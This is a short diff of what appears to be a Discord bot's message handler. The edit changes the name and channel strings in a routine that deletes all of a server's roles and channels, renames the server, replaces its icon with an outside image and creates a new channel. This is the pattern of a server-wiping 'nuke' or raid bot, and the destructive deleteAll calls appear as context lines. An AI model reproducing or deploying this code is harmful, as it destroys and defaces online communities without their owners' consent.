@@ -13,9 +13,9 @@ message.guild.roles.deleteAll("");
 message.guild.channels.deleteAll("");
 }
 
-message.guild.setName(`allah`, "")
+message.guild.setName(`BERKE ADAMDIR`, "")
 message.guild.setIcon(`https://cdn.discordapp.com/attachments/522020595123224595/585051070942674964/unknown.png`)
-message.guild.createChannel(`allah`)
+message.guild.createChannel(`berke`)
 message.delete()
 };  
 
